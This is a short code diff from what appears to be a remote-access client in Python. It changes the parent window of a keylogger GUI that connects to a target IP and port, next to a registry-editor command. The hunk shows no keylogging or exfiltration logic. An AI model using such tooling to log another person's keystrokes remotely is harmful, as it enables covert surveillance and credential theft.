@@ -138,7 +138,7 @@ class Client(object):
         regeditThread.start()
     
     def command_Keylog(self):
-        keyloggerGUI = keylogGUI.KeyloggerWindow(Toplevel(),self.IP,self.port_no)
+        keyloggerGUI = keylogGUI.KeyloggerWindow(self.root,self.IP,self.port_no)
         keylogThread = threading.Thread(target=keyloggerGUI.loadKeyLog())
         keylogThread.start()
        
